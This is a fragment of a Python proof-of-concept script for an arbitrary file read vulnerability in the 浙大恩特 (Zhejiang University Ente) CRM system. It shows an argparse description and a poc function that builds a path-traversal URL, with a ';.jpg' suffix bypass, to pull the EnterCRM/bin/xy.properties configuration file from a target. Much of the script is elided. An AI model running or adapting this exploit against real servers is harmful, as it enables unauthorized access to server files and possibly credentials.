...
def main():
    banner()
    parser = argparse.ArgumentParser(description="浙大恩特客户资源管理系统Ri0004_openFileByStream.jsp接口存在任意文件读取漏洞")
...
def poc(target):
    ...
    url = target+'/entsoft/module/i0004_openFileByStream.jsp;.jpg?filepath=/../EnterCRM/bin/xy.properties&filename=conan'
